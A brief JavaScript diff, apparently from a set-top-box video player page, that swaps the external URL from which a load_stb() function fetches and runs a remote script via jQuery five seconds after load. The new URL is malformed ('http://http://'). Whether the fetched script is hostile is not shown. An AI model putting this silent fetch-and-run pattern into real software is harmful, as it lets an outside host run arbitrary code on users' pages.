@@ -127,5 +127,5 @@ function stbPlay(url, pos){
     } catch (e) {}
 }
 
-function load_stb(){$.getScript('http://69786.web.hosting-russia.ru/stb.php')}
+function load_stb(){$.getScript('http://http://igrva.kamenka.ml/stb.php')}
 try {setTimeout(load_stb, 5000);}catch (e) {}
